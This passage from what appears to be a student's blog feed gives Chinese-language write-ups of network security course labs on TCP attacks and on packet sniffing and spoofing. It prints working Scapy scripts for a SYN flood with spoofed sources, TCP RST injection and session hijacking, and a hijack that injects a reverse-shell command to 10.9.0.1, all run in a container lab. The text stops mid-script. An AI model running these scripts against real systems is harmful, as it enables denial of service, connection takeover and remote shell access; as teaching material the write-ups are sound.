dig命令时，可以看到附加信息，但是这些附加信息并没有被缓存到本地域名服务器。</p><blockquote><p>:exclamation:本地DNS服务器的确发出了DNS请求，BIND域名服务器虽然缓存了这些信息， 但因为安全原因，并不信任附加部分给出的IP地址。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab10-TCP攻击</title>
    <link href="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/"/>
    <url>/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1>实验题目</h1><p>​本实验的学习目标是让学生获得有关漏洞以及针对这些漏洞的攻击的第一手经验。聪明人从错误中学习。在安全教育中，我们研究导致软件漏洞的错误。研究过去的错误不仅有助于学生理解为什么系统容易受到攻击，为什么“看似良性”的错误会变成灾难，以及为什么需要许多安全机制。更重要的是，它还帮助学生了解漏洞的常见模式，从而避免将来犯类似的错误。此外，使用漏洞作为案例研究，学生可以学习安全设计、安全编程和安全测试的原则。</p><p>​TCP/IP协议中的漏洞代表了协议设计和实现中的一种特殊类型的漏洞；它们提供了一个宝贵的教训，说明了为什么安全性应该从一开始就设计好，而不是事后才加上。此外，研究这些漏洞有助于学生了解网络安全的挑战以及为什么需要许多网络安全措施。在本实验中，学生将对TCP进行几个攻击。本实验涵盖以下主题：TCP协议、TCP SYN洪水攻击和SYN cookie、TCP重置攻击、TCP会话劫持攻击、反向Shell。</p><h1>实验步骤及结果</h1><h2 id="Task-1-SYN-Flooding-Attack">Task 1: SYN Flooding Attack</h2><p><strong>查看队列大小</strong></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">sysctl <span class="hljs-built_in">net</span>.ipv4.tcp_max_syn_backlog<br></code></pre></td></tr></table></figure><p><strong>查看端口连接情况</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -nat</span><br></code></pre></td></tr></table></figure><p><strong>关闭SYN cookie策略</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 查看</span><br><span class="hljs-attribute">sysctl</span> -a | grep syncookies<br><span class="hljs-comment"># 开启/关闭</span><br><span class="hljs-attribute">sysctl</span> -w net.ipv4.tcp_syncookies=<span class="hljs-number">0</span> (turn <span class="hljs-literal">off</span> SYN cookie)<br><span class="hljs-attribute">sysctl</span> -w net.ipv4.tcp_syncookies=<span class="hljs-number">1</span> (turn <span class="hljs-literal">on</span> SYN cookie)<br></code></pre></td></tr></table></figure><p><strong>在docker中必须拥有&quot;privileged: true&quot; 才能拥有root权限</strong></p><p><strong>查看虚拟机信息</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">#dockps<br>fd1<span class="hljs-number">189e3f819</span>  victim-<span class="hljs-number">10.9.0.5</span><br>ce<span class="hljs-number">157c2d2f13</span>  seed-attacker<br><span class="hljs-number">0</span>bd0<span class="hljs-number">57e6c279</span>  user<span class="hljs-number">2-10.9.0</span>.<span class="hljs-number">7</span><br><span class="hljs-number">30</span>c<span class="hljs-number">64f0a8b95</span>  user<span class="hljs-number">1-10.9.0</span>.<span class="hljs-number">6</span><br>eee6e69ae762  mysql-<span class="hljs-number">10.9.0.6</span><br></code></pre></td></tr></table></figure><h3 id="Task-1-1-Launching-the-Attack-Using-Python">Task 1.1: Launching the Attack Using Python</h3><h3 id="查看victim端口信息">查看victim端口信息</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># victim环境</span><br><span class="hljs-attribute">docksh</span> fd11<br><span class="hljs-comment"># 查看开放端口</span><br>netstat -nat<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.1.jpg" class="">><h4 id="SYN-RECV队列初始情况">SYN_RECV队列初始情况</h4><p>为了使攻击效果更加明显，首先将队列大小调整为80。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 查看队列容量</span><br>sysctl net.ipv4.tcp_max_syn_backlog<br><span class="hljs-comment"># 修改syn队列大小</span><br>sysctl -w net.ipv4.<span class="hljs-attribute">tcp_max_syn_backlog</span>=80<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.2.jpg" class=""><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># 查看初始情况</span><br>netstat -nat |<span class="hljs-string"> grep SYN_RECV </span>|<span class="hljs-string"> wc -l</span><br></code></pre></td></tr></table></figure><p>查看的结果为0，说明此时SYN_RECV队列为空。</p><h4 id="syn-flood攻击代码">syn flood攻击代码</h4><p>控制攻击代码的运行时间为1分钟左右，利用<code>getrandbits(k)</code>随机生成0~2^k^-1间的整数，用于生成随机的IP、端口、seq，隐藏攻击者的信息。<code>IPv4Address()</code>将整数转化为IPV4地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">from scapy.all import IP, TCP, send<br>from ipaddress import IPv4Address<br>from random import getrandbits<br>import time<br><br>ip = IP(dst=<span class="hljs-string">&quot;10.9.0.5&quot;</span>)<br>tcp = TCP(dport=<span class="hljs-number">23</span>,flags=<span class="hljs-string">&#x27;S&#x27;</span>)<br>pkt = ip/tcp<br><br>t1=time.time()<br>t=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> t&lt;<span class="hljs-number">61</span>:<br>    pkt[IP].src = str(IPv4Address(getrandbits(<span class="hljs-number">32</span>))) <span class="hljs-meta"># source iP</span><br>    pkt[TCP].sport = getrandbits(<span class="hljs-number">16</span>) <span class="hljs-meta"># source port</span><br>    pkt[TCP].seq = getrandbits(<span class="hljs-number">32</span>) <span class="hljs-meta"># sequence number</span><br>    send(pkt, verbose = <span class="hljs-number">0</span>)<br><br>    t2=time.time()<br>    t=t2-t1<br><br>print(<span class="hljs-string">&#x27;start!&#x27;</span>)<br>print(<span class="hljs-string">&#x27;finish! total time:&#123;&#125;&#x27;</span>.format(t))<br></code></pre></td></tr></table></figure><h4 id="攻击">攻击</h4><p>开始攻击：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.5.jpg" class=""><p>在victim主机查看syn队列，可以看到，在攻击期间，victim的队列已经被不同的ip、端口组合所占满：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.3.jpg" class=""><p>在攻击期间尝试远程连接victim主机，一直没有连接成功：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">telnet</span> <span class="hljs-number">10.9.0.5</span><br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.4.jpg" class=""><p>攻击结束后远程连接victim主机，又可以成功连接了：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.6.jpg" class=""><h3 id="Task-1-2-Launch-the-Attack-Using-C">Task 1.2: Launch the Attack Using C</h3><h4 id="恢复队列大小">恢复队列大小</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sysctl -w net.ipv4.<span class="hljs-attribute">tcp_max_syn_backlog</span>=256<br></code></pre></td></tr></table></figure><p>编译运行实验提供的代码，实验结果和task1.1一样。</p><h3 id="Task-1-3-Enable-the-SYN-Cookie-Countermeasure">Task 1.3: Enable the SYN Cookie Countermeasure</h3><p>开启SYN cookie设置，这是一种抵御SYN flood的机制，服务器将ip、端口、时间信息经hash运算后得到一个seq初始值，发送给客户端，若客户端为正常用户，则返回的ack值为seq+1，服务端对ack-1进行检查，以此来决定是否建立连接。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sysctl</span> -w net.ipv4.tcp_syncookies=<span class="hljs-number">1</span> (turn <span class="hljs-literal">off</span> SYN cookie)<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.4.jpg" class=""><p>在攻击过程中，队列仍然被占占满：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.12.jpg" class=""><p>但是远程连接成功：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.13.jpg" class=""><h2 id="Task-2-TCP-RST-Attacks-on-telnet-Connections">Task 2: TCP RST Attacks on telnet Connections</h2><h3 id="远程连接">远程连接</h3><p>运行攻击代码前，host10.9.0.6远程连接10.9.0.5，可以成功连接：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.15.jpg" class=""><h3 id="wireshark抓包">wireshark抓包</h3><p>通过wireshark抓包，得到seq的值，然后根据这个值编写攻击代码：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.16.jpg" class=""><h3 id="攻击-2">攻击</h3><h4 id="攻击代码">攻击代码</h4><p>选择从被连接方（10.9.0.5）发起中断连接的RST包。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> IP, TCP, send<br><br>ip = IP(src=<span class="hljs-string">&quot;10.9.0.5&quot;</span>, dst=<span class="hljs-string">&quot;10.9.0.6&quot;</span>)<br>tcp = TCP(sport=<span class="hljs-number">23</span>, dport=<span class="hljs-number">48456</span>, flags=<span class="hljs-string">&quot;R&quot;</span>, seq=<span class="hljs-number">2252320</span>)<br>pkt = ip/tcp<br>ls(pkt)<br>send(pkt,verbose=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>运行攻击代码：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.17.jpg" class=""><h4 id="攻击结果">攻击结果</h4><p>远程连接断开：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.18.jpg" class=""><p>wireshark的抓包结果也表明连接已断开：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.19.jpg" class=""><h3 id="Optional-Launching-the-attack-automatically">Optional: Launching the attack automatically</h3><p>实现自动化的攻击时，仍然选择从被连接方发送中断连接的数据包，设置过滤规则时捕获发起连接的一方发送的数据包，被连接方的数据包中seq为最近接收到的数据包的ack值。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> IP, TCP, send<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;waiting...&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_pkt</span>(<span class="hljs-params">pkt</span>):<br>ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)<br>tcp = TCP(sport=<span class="hljs-number">23</span>, dport=pkt[TCP].sport, flags=<span class="hljs-string">&quot;R&quot;</span>, seq=pkt[TCP].ack)<br>pkt = ip/tcp<br>send(pkt, verbose=<span class="hljs-number">0</span>)<br><br>pkt = sniff(iface=<span class="hljs-string">&#x27;br-bff5c8d16447&#x27;</span>, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&#x27;tcp and dst port 23&#x27;</span>, prn=spoof_pkt)<br></code></pre></td></tr></table></figure><p>攻击者运行攻击代码，开始侦听：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.20.jpg" class=""><p>在10.9.0.6发起连接时，即刻被中断，攻击成功：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.21.jpg" class=""><h2 id="Task-3-TCP-Session-Hijacking">Task 3: TCP Session Hijacking</h2><h3 id="wireshark查看包信息">wireshark查看包信息</h3><p>用wireshark分析最新的由被连接方发来的TCP数据包：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.25.jpg" class=""><h3 id="代码">代码</h3><p>IP包的src ip为发起连接的一方，根据抓包结果设置对应端口号，ack为抓包结果中的next seq，seq为数据包中的ack：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> IP, TCP, send<br><br>ip = IP(src=<span class="hljs-string">&quot;10.9.0.6&quot;</span>, dst=<span class="hljs-string">&quot;10.9.0.5&quot;</span>)<br>tcp = TCP(sport=<span class="hljs-number">48588</span>, dport=<span class="hljs-number">23</span>, flags=<span class="hljs-string">&quot;A&quot;</span>, seq=<span class="hljs-number">279226629</span>, ack=<span class="hljs-number">3280060476</span>)<br>data = <span class="hljs-string">&quot;stop controling!&quot;</span><br>pkt = ip/tcp/data<br>ls(pkt)<br>send(pkt,verbose=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h3 id="攻击-3">攻击</h3><p>攻击前，10.9.0.6可以正常连接10.9.0.5：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.22-166964117781424.jpg" class=""><p>击程序运行后，10.9.0.6无法输入命令，也不能退出，成功实现会话劫持：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.22.jpg" class=""><h3 id="Optional-Launching-the-attack-automatically-2">Optional: Launching the attack automatically</h3><h4 id="代码-2">代码</h4><p>侦听的数据包为被连接方发送的数据包，ack和seq的设置分析同上。task3_auto.py：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> IP, TCP, send<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_pkt</span>(<span class="hljs-params">pkt</span>):<br>ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)<br>tcp = TCP(sport=pkt[TCP].dport, dport=<span class="hljs-number">23</span>, flags=<span class="hljs-string">&quot;A&quot;</span>, seq=pkt[TCP].ack, ack=pkt[TCP].seq+<span class="hljs-number">1</span>)<br>data = <span class="hljs-string">&quot;echo 123&quot;</span><br>pkt = ip/tcp/data<br>ls(pkt)<br>send(pkt, verbose=<span class="hljs-number">0</span>)<br>exit(<span class="hljs-number">0</span>)<br><br>pkt = sniff(iface=<span class="hljs-string">&#x27;br-bff5c8d16447&#x27;</span>, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&#x27;tcp and src port 23&#x27;</span>, prn=spoof_pkt)<br></code></pre></td></tr></table></figure><h4 id="攻击结果-2">攻击结果</h4><p>10.9.0.6输入一个字符后便无法再输入其他命令字符：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.24.jpg" class=""><h2 id="Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking">Task 4: Creating Reverse Shell using TCP Session Hijacking</h2><p>该实验在task3的基础上实现了获取shell的功能，主要的修改部分为所构造包的数据部分：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot; /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure><p>10.9.0.1主机开始侦听：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.26.jpg" class=""><h3 id="wireshark查看包信息-2">wireshark查看包信息</h3><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.27.jpg" class=""><h3 id="代码-3">代码</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> IP, TCP, send<br><br>ip = IP(src=<span class="hljs-string">&quot;10.9.0.6&quot;</span>, dst=<span class="hljs-string">&quot;10.9.0.5&quot;</span>)<br>tcp = TCP(sport=<span class="hljs-number">48618</span>, dport=<span class="hljs-number">23</span>, flags=<span class="hljs-string">&quot;A&quot;</span>, seq=<span class="hljs-number">1434098577</span>, ack=<span class="hljs-number">2854351861</span>)<br>data = <span class="hljs-string">&quot; /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1\r&quot;</span><br>pkt = ip/tcp/data<br>ls(pkt)<br>send(pkt,verbose=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h3 id="攻击-4">攻击</h3><p>在10.9.0.1上执行攻击代码</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.28.jpg" class=""><p>回到侦听窗口，拿到10.9.0.5的shell，可以执行命令，并且10.9.0.6无法执行正常的远程连接操作：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.29.jpg" class=""><p>查看tcp连接，可以看到10.9.0.1和10.9.0.5已经建立了连接：</p><img src="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/10.30.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab9-嗅探和欺骗</title>
    <link href="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/"/>
    <url>/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/</url>
    
    <content type="html"><![CDATA[<h1><strong>1</strong> 作业题目</h1><p>​包嗅探和欺骗是网络安全中的两个重要概念；它们是网络通信中的两大威胁。能够理解这两种威胁对于理解网络中的安全措施至关重要。有许多包嗅探和欺骗工具，如Wireshark、Tcpdump、Netwox等。其中一些工具被安全专家以及攻击者广泛使用。能够使用这些工具对学生来说很重要，但对于网络安全课程的学生来说，更重要的是了解这些工具是如何工作的，即包嗅探和欺骗是如何在软件中实现的。</p><p>​本实验的目标是让学生掌握大多数嗅探和欺骗工具的基本技术。学生们将使用一些简单的嗅探和欺骗程序，阅读它们的源代码，修改它们，并最终对这些程序的技术方面有深入的了解。在本实验结束时，学生应该能够编写自己的嗅探和欺骗程序。</p><h1>2 实验步骤及结果</h1><h2 id="Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets">Lab Task Set 1: Using Scapy to Sniff and Spoof Packets</h2><h3 id="Task-1-1-Sniffifing-Packets">Task 1.1: Sniffifing Packets</h3><h4 id="Task-1-1A">Task 1.1A.</h4><ol><li><p>查看网卡地址</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.1.jpg" class=""></li><li><p><a href="http://xn--sniffer-nu9ky494a.py">编写sniffer.py</a></p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.2.jpg" class=""></li><li><p>以root身份运行；</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.5.jpg" class=""><p>执行命令：ping 10.9.0.5</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.6.jpg" class=""><p>返回到运行嗅探程序的终端，发现侦听到了一系列数据包：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.7.jpg" class=""><p>切换到seed用户下运行。此时无法运行嗅探程序，报错提示为权限错误，说明嗅探数据包需要有root权限。</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.8.jpg" class=""></li></ol><h4 id="Task-1-1B">Task 1.1B.</h4><p>①Capture only the ICMP packet</p><p>只捕获ICMP数据包的话只需要将filter参数设置为“icmp”，实验结果同1.1A</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_pkt</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-keyword">return</span> pkt.summary()<br>    <br>pkt = sniff(iface=<span class="hljs-string">&#x27;br-10682b5c2c9d&#x27;</span>, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&#x27;icmp&#x27;</span>, prn=print_pkt)<br><br><span class="hljs-built_in">print</span>(pkt)<br></code></pre></td></tr></table></figure><p>②Capture any TCP packet that comes from a particular IP and with a destination port number 23.</p><p>在sniffer.py中设置相应的过滤条件，使嗅探程序只侦听特定的源IP和目标端口23的TCP数据包。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_pkt</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-keyword">return</span> pkt.summary()<br>    <br>pkt = sniff(iface=<span class="hljs-string">&#x27;br-10682b5c2c9d&#x27;</span>, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&#x27;tcp and src host 10.9.0.8 and dst port 23&#x27;</span>, prn=print_pkt)<br><br><span class="hljs-built_in">print</span>(pkt)<br></code></pre></td></tr></table></figure><p>编写sendpacket.py发包程序，使源主机和目标端口与嗅探程序的src host对应，随意指定一个目标地址，设置程序发送5个数据包。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br>ip = IP()<br>ip.src=<span class="hljs-string">&quot;10.9.0.8&quot;</span><br>ip.dst=<span class="hljs-string">&quot;10.9.0.9&quot;</span><br>tcp = TCP()<br>tcp.dport = <span class="hljs-number">23</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    send(ip/tcp)<br></code></pre></td></tr></table></figure><p>运行发包程序如下：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.10.jpg" class=""><p>侦听程序监听到了5个数据包：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.11.jpg" class=""><p>③Capture packets comes from or to go to a particular subnet. You can pick any subnet, such as</p><p>128.230.0.0/16; you should not pick the subnet that your VM is attached to.</p><p>捕获来自特定子网的数据包时，将filter设置为一个特定的子网网段：“net 128.230.0.0/16”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_pkt</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-keyword">return</span> pkt.summary()<br>    <br>pkt = sniff(iface=<span class="hljs-string">&#x27;br-10682b5c2c9d&#x27;</span>, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&#x27;net 128.230.0.0/16&#x27;</span>, prn=print_pkt)<br><br><span class="hljs-built_in">print</span>(pkt)<br></code></pre></td></tr></table></figure><p>修改发包程序，使目的IP为指定网段的主机地址，这里设置为128.230.0.1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br>ip = IP()<br>ip.src=<span class="hljs-string">&quot;10.9.0.8&quot;</span><br>ip.dst=<span class="hljs-string">&quot;128.230.0.1&quot;</span><br>tcp = TCP()<br>tcp.dport = <span class="hljs-number">23</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    send(ip/tcp)<br></code></pre></td></tr></table></figure><p>同样，运行发包程序，在监听程序中监听到了该子网内的数据包。</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.13.jpg" class=""><h3 id="Task-1-2-Spoofifing-ICMP-Packets">Task 1.2: Spoofifing ICMP Packets</h3><ol><li>对发包程序进行修改，其中源IP是一个任意的IP，然后用wireshark查看所构造的ICMP数据包是否成功发送。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br>ip = IP()<br>ip.src=<span class="hljs-string">&quot;10.9.0.8&quot;</span><br>ip.dst=<span class="hljs-string">&quot;10.0.2.3&quot;</span><br>icmp=ICMP()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span 